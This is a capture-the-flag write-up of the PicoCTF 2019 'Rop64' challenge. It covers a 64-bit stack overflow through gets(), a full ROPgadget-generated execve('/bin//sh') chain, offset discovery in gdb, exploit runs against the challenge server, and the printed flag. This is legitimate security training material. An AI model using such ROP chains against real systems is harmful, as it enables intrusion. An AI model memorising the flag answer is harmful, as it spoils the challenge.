# Rop64 | PicoCTF2019
## Problem
Time for the classic ROP in 64-bit. Can you exploit this program to get a flag?

## Solution

### 1. Look at the code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("Can you ROP your way out of this?\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}
```
The source is pretty much identical to the 32-bit version. Call vuln() and run gets with a buffer size of 16.

### 2. Construct a payload
Just like last time, ROPgadget is the go-to.
```bash
kali@kali:~/Desktop/pctf/rop64$ ROPgadget --binary ./vuln --ropchain --badbytes 0a
...

Unique gadgets found: 42235

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x47f561 mov qword ptr [rsi], rax ; ret
        [+] Gadget found: 0x4100d3 pop rsi ; ret
        [+] Gadget found: 0x4156f4 pop rax ; ret
        [+] Gadget found: 0x444c50 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

        [+] Gadget found: 0x444c50 xor rax, rax ; ret
        [+] Gadget found: 0x4749c0 add rax, 1 ; ret
        [+] Gadget found: 0x4749c1 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

        [+] Gadget found: 0x400686 pop rdi ; ret
        [+] Gadget found: 0x4100d3 pop rsi ; ret
        [+] Gadget found: 0x4499b5 pop rdx ; ret

- Step 4 -- Syscall gadget

        [+] Gadget found: 0x40123c syscall

- Step 5 -- Build the ROP chain

        #!/usr/bin/env python2
        # execve generated by ROPgadget

        from struct import pack

        # Padding goes here
        p = ''

        p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
        p += pack('<Q', 0x00000000006b90e0) # @ .data
        p += pack('<Q', 0x00000000004156f4) # pop rax ; ret
        p += '/bin//sh'
        p += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
        p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
        p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
        p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
        p += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
        p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
        p += pack('<Q', 0x00000000006b90e0) # @ .data
        p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
        p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
        p += pack('<Q', 0x00000000004499b5) # pop rdx ; ret
        p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
        p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
        p += pack('<Q', 0x000000000040123c) # syscall
```

### 3. Find the offset
Reference: https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558  
Actually looked up how to do this for once, instead of stumbling through like I've tended to do with 64bit.
```bash
kali@kali:~/Desktop/pctf/rop64$ python -c "from pwn import cyclic; print(cyclic(100))" > pattern.in
kali@kali:~/Desktop/pctf/rop64$ gdb -q vuln
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) r < pattern.in
Starting program: /home/kali/Desktop/pctf/rop64/vuln < pattern.in
Can you ROP your way out of this?

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400b6e in vuln ()
(gdb) x $rbp
0x6161616661616165:     Cannot access memory at address 0x6161616661616165
(gdb) info frame
Stack level 0, frame at 0x7fffffffe0a8:
 rip = 0x400b6e in vuln; saved rip = 0x6161616861616167 <---- here
 called by frame at 0x7fffffffe0b8
 Arglist at 0x6161616661616165, args: 
 Locals at 0x6161616661616165, Previous frame's sp is 0x7fffffffe0b0
 Saved registers:
  rip at 0x7fffffffe0a8
```
From here, calculate the offset.
```bash
kali@kali:~$ cyclic -l 0x61616167
24
```
The offset is 24 bytes.

### 4. Complete the payload
Now I can write the pwntools script with the ROPgadget payload and offset (see solve.py), then test offline.
```bash
kali@kali:~/Desktop/pctf/rop64$ python solve.py
[*] '/home/kali/Desktop/pctf/rop64/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/kali/Desktop/pctf/rop64/vuln': pid 2613
[*] Switching to interactive mode
$ exit
[*] Got EOF while reading in interactive
$ exit
[*] Process '/home/kali/Desktop/pctf/rop64/vuln' stopped with exit code 0 (pid 2613)
```
No errors is probably a good sign.

### 5. Run it on the server to win
```bash
kali@kali:~/Desktop/pctf/rop64$ python solve.py 
[*] '/home/kali/Desktop/pctf/rop64/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/kali/Desktop/pctf/rop64/vuln': pid 2583
[*] Switching to interactive mode
$ whoami
kali
$ exit
[*] Got EOF while reading in interactive
$ quit
[*] Process '/home/kali/Desktop/pctf/rop64/vuln' stopped with exit code 0 (pid 2583)
[*] Got EOF while sending in interactive
kali@kali:~/Desktop/pctf/rop64$ python solve.py REMOTE
[*] '/home/kali/Desktop/pctf/rop64/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] jib1337@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process u'vuln' on 2019shell1.picoctf.com: pid 2173564
[*] Switching to interactive mode
$ $ ls
flag.txt  vuln    vuln.c
$ $ cat flag.txt
picoCTF{rOp_t0_b1n_sH_w1tH_n3w_g4dg3t5_5e28dda5}
```
